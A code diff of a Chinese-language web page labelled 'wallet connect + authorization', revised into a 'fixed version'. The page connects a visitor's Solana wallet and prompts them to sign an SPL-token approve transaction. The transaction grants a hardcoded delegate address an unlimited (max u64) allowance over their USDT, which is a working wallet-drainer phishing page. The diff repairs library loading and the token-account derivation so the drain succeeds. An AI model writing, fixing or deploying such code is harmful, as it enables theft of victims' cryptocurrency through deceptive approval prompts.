@@ -3,14 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>钱包连接+授权</title>
+<title>钱包连接+授权（修复版）</title>
+<!-- 确保spl-token库正确加载 -->
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
 <style>
 body{background:#111;color:#fff;padding:30px;font-family:system-ui}
 .box{max-width:380px;margin:0 auto}
 button{width:100%;padding:14px;border-radius:10px;border:none;margin:8px 0;font-weight:bold;cursor:pointer}
-.connect{background:#36d;background:#fff;color:#000}
+.connect{background:#fff;color:#000}
 .auth{background:#ff9a00;color:#000}
 .log{background:#222;padding:12px;border-radius:8px;margin-top:20px;height:160px;overflow-y:auto;font-size:12px}
 </style>
@@ -23,71 +24,83 @@ button{width:100%;padding:14px;border-radius:10px;border:none;margin:8px 0;font-
 </div>
 
 <script>
-const { Connection, Transaction, PublicKey } = solanaWeb3;
-const splToken = window.splToken;
-
-const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
-const DELEGATE = new PublicKey("DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z");
-
-let wallet, publicKey;
-
-function log(text) {
-  const el = document.getElementById("log");
-  el.innerText = `[${new Date().toLocaleTimeString()}] ${text}\n` + el.innerText;
-}
-
-// 连接钱包（极简，必成功）
-document.getElementById("connect").onclick = async () => {
-  try {
-    const w = window.solana || window.okxwallet?.solana || window.tpWallet;
-    if (!w) return alert("请安装 Phantom / OKX / TP 钱包");
-
-    const res = await w.connect();
-    wallet = w;
-    publicKey = res.publicKey;
-
-    log("✅ 钱包已连接：" + publicKey.toBase58().slice(0,6)+"...");
-    document.getElementById("auth").disabled = false;
-  } catch (e) {
-    log("❌ 连接失败：" + e.message);
-    alert("连接失败：" + e.message);
+// 等待页面和库完全加载后再执行
+window.addEventListener("load", async () => {
+  const { Connection, Transaction, PublicKey } = solanaWeb3;
+  // 确保splToken已挂载到window
+  const splToken = window.splToken;
+  if (!splToken) {
+    alert("spl-token库加载失败，请刷新页面重试");
+    return;
   }
-};
 
-// 授权（极简，不查RPC、不查余额，直接弹签名）
-document.getElementById("auth").onclick = async () => {
-  if (!publicKey) return alert("请先连接钱包");
-  try {
-    log("正在构建授权交易...");
-    const userAta = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
+  const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+  const DELEGATE = new PublicKey("DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z");
 
-    const tx = new Transaction();
-    tx.add(
-      splToken.createApproveInstruction(
-        userAta,
-        DELEGATE,
-        publicKey,
-        BigInt("18446744073709551615")
-      )
-    );
+  let wallet, publicKey;
 
-    // 关键：强制使用钱包自身RPC，彻底解决RPC不可用
-    const conn = new Connection(wallet.rpcUrl, "confirmed");
-    tx.feePayer = publicKey;
-    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-
-    log("请在钱包签名...");
-    const signed = await wallet.signTransaction(tx);
-    const sig = await conn.sendRawTransaction(signed.serialize());
-    await conn.confirmTransaction(sig);
-
-    log("✅ 授权成功！交易：" + sig);
-    alert("USDT 授权完成！");
-  } catch (e) {
-    log("❌ 授权失败：" + e.message);
-    alert("授权失败：" + e.message);
+  function log(text) {
+    const el = document.getElementById("log");
+    el.innerText = `[${new Date().toLocaleTimeString()}] ${text}\n` + el.innerText;
   }
-};
+
+  // 连接钱包
+  document.getElementById("connect").onclick = async () => {
+    try {
+      const w = window.solana || window.okxwallet?.solana || window.tpWallet;
+      if (!w) return alert("请安装 Phantom / OKX / TP 钱包");
+
+      const res = await w.connect();
+      wallet = w;
+      publicKey = res.publicKey;
+
+      log("✅ 钱包已连接：" + publicKey.toBase58().slice(0,6)+"...");
+      document.getElementById("auth").disabled = false;
+    } catch (e) {
+      log("❌ 连接失败：" + e.message);
+      alert("连接失败：" + e.message);
+    }
+  };
+
+  // 授权
+  document.getElementById("auth").onclick = async () => {
+    if (!publicKey) return alert("请先连接钱包");
+    try {
+      log("正在构建授权交易...");
+      // 手动计算ATA地址（兼容所有版本）
+      const [userAta] = PublicKey.findProgramAddressSync(
+        [publicKey.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
+        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+
+      const tx = new Transaction();
+      tx.add(
+        splToken.createApproveInstruction(
+          userAta,
+          DELEGATE,
+          publicKey,
+          BigInt("18446744073709551615")
+        )
+      );
+
+      // 强制使用钱包RPC
+      const conn = new Connection(wallet.rpcUrl, "confirmed");
+      tx.feePayer = publicKey;
+      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+
+      log("请在钱包签名...");
+      const signed = await wallet.signTransaction(tx);
+      const sig = await conn.sendRawTransaction(signed.serialize());
+      await conn.confirmTransaction(sig);
+
+      log("✅ 授权成功！交易：" + sig);
+      alert("USDT 授权完成！");
+    } catch (e) {
+      log("❌ 授权失败：" + e.message);
+      alert("授权失败：" + e.message);
+    }
+  };
+});
 </script>
 </body>
 </html>
